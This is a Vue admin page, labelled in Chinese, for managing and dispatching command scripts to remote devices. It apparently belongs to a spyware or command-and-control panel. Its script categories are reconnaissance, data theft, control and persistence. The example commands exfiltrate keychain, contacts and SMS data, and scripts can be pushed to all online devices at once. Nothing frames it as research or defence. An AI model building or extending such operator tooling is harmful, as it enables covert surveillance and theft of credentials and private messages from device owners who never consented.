<template>
  <div class="scripts-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">脚本管理</div>
        <div class="page-subtitle">命令脚本库 CRUD，可快速发送到设备</div>
      </div>
      <el-button type="primary" @click="openCreate">
        <el-icon><Plus /></el-icon>
        <span>新建脚本</span>
      </el-button>
    </div>

    <div class="search-bar">
      <el-select v-model="filters.category" placeholder="分类" clearable style="width:140px;" @change="loadList">
        <el-option label="信息收集" value="recon" />
        <el-option label="数据窃取" value="exfil" />
        <el-option label="控制命令" value="control" />
        <el-option label="持久化" value="persist" />
      </el-select>
      <el-input v-model="filters.q" placeholder="搜索脚本名称" clearable style="width:260px;" @clear="loadList" @keyup.enter="loadList">
        <template #prefix><el-icon><Search /></el-icon></template>
      </el-input>
      <el-button type="primary" @click="loadList">搜索</el-button>
    </div>

    <el-table :data="list" stripe>
      <el-table-column prop="name" label="脚本名称" width="200">
        <template #default="{ row }">
          <el-icon style="color:#409eff;"><Document /></el-icon>
          <span style="margin-left:6px;font-weight:500;">{{ row.name }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="slug" label="Slug" width="160">
        <template #default="{ row }"><span class="mono text-muted">{{ row.slug }}</span></template>
      </el-table-column>
      <el-table-column prop="category" label="分类" width="110">
        <template #default="{ row }">
          <el-tag size="small" :type="catTag(row.category)" effect="plain">{{ catLabel(row.category) }}</el-tag>
        </template>
      </el-table-column>
      <el-table-column prop="description" label="描述" show-overflow-tooltip />
      <el-table-column prop="use_count" label="使用次数" width="100" sortable />
      <el-table-column prop="created_at" label="创建时间" width="170">
        <template #default="{ row }"><span class="text-muted">{{ formatDate(row.created_at) }}</span></template>
      </el-table-column>
      <el-table-column label="操作" width="200" fixed="right">
        <template #default="{ row }">
          <el-button type="primary" link size="small" @click="runScript(row)">运行</el-button>
          <el-button type="primary" link size="small" @click="openEdit(row)">编辑</el-button>
          <el-button type="danger" link size="small" @click="deleteRow(row)">删除</el-button>
        </template>
      </el-table-column>
    </el-table>

    <el-pagination
      v-model:current-page="page"
      v-model:page-size="pageSize"
      :page-sizes="[20, 50, 100]"
      :total="total"
      layout="total, sizes, prev, pager, next"
      background
      @current-change="loadList"
      @size-change="loadList"
    />
  </div>

  <el-dialog v-model="dialogVisible" :title="form.id ? '编辑脚本' : '新建脚本'" width="680px" top="4vh">
    <el-form :model="form" :rules="rules" ref="formRef" label-width="90px">
      <el-row :gutter="12">
        <el-col :span="12">
          <el-form-item label="名称" prop="name">
            <el-input v-model="form.name" placeholder="脚本显示名称" />
          </el-form-item>
        </el-col>
        <el-col :span="12">
          <el-form-item label="Slug" prop="slug">
            <el-input v-model="form.slug" placeholder="英文标识，如 collect_all" :disabled="!!form.id" />
          </el-form-item>
        </el-col>
      </el-row>
      <el-form-item label="分类" prop="category">
        <el-select v-model="form.category" style="width:100%;">
          <el-option label="信息收集" value="recon" />
          <el-option label="数据窃取" value="exfil" />
          <el-option label="控制命令" value="control" />
          <el-option label="持久化" value="persist" />
        </el-select>
      </el-form-item>
      <el-form-item label="描述">
        <el-input v-model="form.description" placeholder="脚本说明" />
      </el-form-item>
      <el-form-item label="脚本内容" prop="content">
        <el-input
          v-model="form.content"
          type="textarea"
          :rows="14"
          class="mono"
          placeholder="每行一条命令，例如：&#10;ds_exfil_keychain&#10;ds_exfil_contacts&#10;ds_exfil_sms"
        />
      </el-form-item>
    </el-form>
    <template #footer>
      <el-button @click="dialogVisible = false">取消</el-button>
      <el-button type="primary" :loading="submitting" @click="submitForm">保存</el-button>
    </template>
  </el-dialog>

  <el-dialog v-model="runDialogVisible" title="运行脚本" width="520px">
    <el-form label-width="90px">
      <el-form-item label="选择脚本">
        <el-input v-model="runForm.name" disabled />
      </el-form-item>
      <el-form-item label="目标设备">
        <el-select
          v-model="runForm.targets"
          multiple
          filterable
          remote
          :remote-method="searchDevices"
          placeholder="选择设备 UUID，可多选；留空则发送到全部在线设备"
          style="width:100%;"
        >
          <el-option v-for="d in deviceSearchList" :key="d.uuid" :label="d.label" :value="d.uuid" />
        </el-select>
      </el-form-item>
    </el-form>
    <template #footer>
      <el-button @click="runDialogVisible = false">取消</el-button>
      <el-button type="primary" :loading="runLoading" @click="confirmRun">确认发送</el-button>
    </template>
  </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Search, Document } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid, require2FA } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(20)
const filters = reactive({ category: '', q: '' })
const deviceSearchList = ref([])

const dialogVisible = ref(false)
const submitting = ref(false)
const formRef = ref(null)
const form = reactive(defaultForm())
const rules = {
  name: [{ required: true, message: '请输入名称', trigger: 'blur' }],
  slug: [{ required: true, message: '请输入 Slug', trigger: 'blur' }],
  category: [{ required: true, message: '请选择分类', trigger: 'change' }],
  content: [{ required: true, message: '请输入脚本内容', trigger: 'blur' }]
}

const runDialogVisible = ref(false)
const runLoading = ref(false)
const runForm = reactive({ id: null, name: '', targets: [] })

function defaultForm() {
  return { id: null, name: '', slug: '', category: 'recon', description: '', content: '' }
}
function catTag(c) { return { recon: 'primary', exfil: 'warning', control: 'danger', persist: 'info' }[c] || 'info' }
function catLabel(c) { return { recon: '信息收集', exfil: '数据窃取', control: '控制命令', persist: '持久化' }[c] || c }

function openCreate() {
  Object.assign(form, defaultForm())
  dialogVisible.value = true
}
function openEdit(row) {
  Object.assign(form, { ...defaultForm(), ...row })
  dialogVisible.value = true
}

async function searchDevices(q) {
  try {
    const res = await axios.get('/api/devices', { params: { q, page_size: 20 } })
    const raw = res.data?.items || res.data || []
    deviceSearchList.value = raw.map(d => {
      const uuid = d.device_uuid || d.uuid
      const os = d.os_version || d.os || ''
      const status = d.status || ''
      return { uuid, label: `${shortUuid(uuid)} ${os} ${status}`.trim() }
    })
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备搜索失败'
    ElMessage.error(msg)
    deviceSearchList.value = []
  }
}

function runScript(row) {
  runForm.id = row.id
  runForm.name = row.name
  runForm.targets = []
  runDialogVisible.value = true
}

async function confirmRun() {
  runLoading.value = true
  try {
    const otp = await require2FA('run script')
    if (otp === false) { runLoading.value = false; return }
    const params = {}
    if (otp) params.otp_code = otp
    const res = await axios.post(`/api/commands/scripts/${runForm.id}/run`, { targets: runForm.targets }, { params })
    const n = typeof res.data?.devices === 'number' ? res.data.devices : (runForm.targets.length || 0)
    ElMessage.success(`脚本已发送到 ${n || '全部在线'} 设备`)
    runDialogVisible.value = false
    loadList()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '发送失败'
    ElMessage.error(msg)
  } finally {
    runLoading.value = false
  }
}

async function submitForm() {
  if (!formRef.value) return
  const valid = await formRef.value.validate().catch(() => false)
  if (!valid) return
  submitting.value = true
  try {
    const otp = await require2FA(form.id ? 'update script' : 'create script')
    if (otp === false) { submitting.value = false; return }
    const params = {}
    if (otp) params.otp_code = otp
    if (form.id) {
      await axios.patch(`/api/commands/scripts/${form.id}`, form, { params })
      ElMessage.success('已更新')
    } else {
      await axios.post('/api/commands/scripts', form, { params })
      ElMessage.success('创建成功')
    }
    dialogVisible.value = false
    loadList()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '保存失败'
    ElMessage.error(msg)
  } finally {
    submitting.value = false
  }
}

async function deleteRow(row) {
  try {
    await ElMessageBox.confirm(`确认删除脚本「${row.name}」？`, '删除脚本', { type: 'warning' })
    const otp = await require2FA('delete script')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/commands/scripts/${row.id}`, { params })
    ElMessage.success('已删除')
    loadList()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '删除失败'
      ElMessage.error(msg)
    }
  }
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      search: filters.q || undefined,
      category: filters.category || undefined,
    }
    const res = await axios.get('/api/commands/scripts', { params })
    list.value = res.data?.items || res.data || []
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '脚本列表加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

onMounted(loadList)
</script>
